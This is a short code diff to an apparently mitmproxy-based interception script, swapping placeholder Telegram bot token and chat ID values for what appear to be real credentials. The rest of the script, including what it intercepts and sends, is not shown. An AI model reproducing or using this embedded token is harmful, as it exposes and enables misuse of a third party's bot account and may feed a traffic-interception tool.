@@ -3,8 +3,8 @@ import requests
 from mitmproxy import http, ctx
 
 # Telegram bot token and chat ID
-TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
-TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
+TELEGRAM_BOT_TOKEN = '7195510626:AAEESkdWYtD8sG-qKgHW6Sod0AsdS3E4zmY'
+TELEGRAM_CHAT_ID = '-1002020685168'
 
 # Domains to intercept for modifying requests and corresponding keys
 DOMAIN_KEYS_MAPPING = {
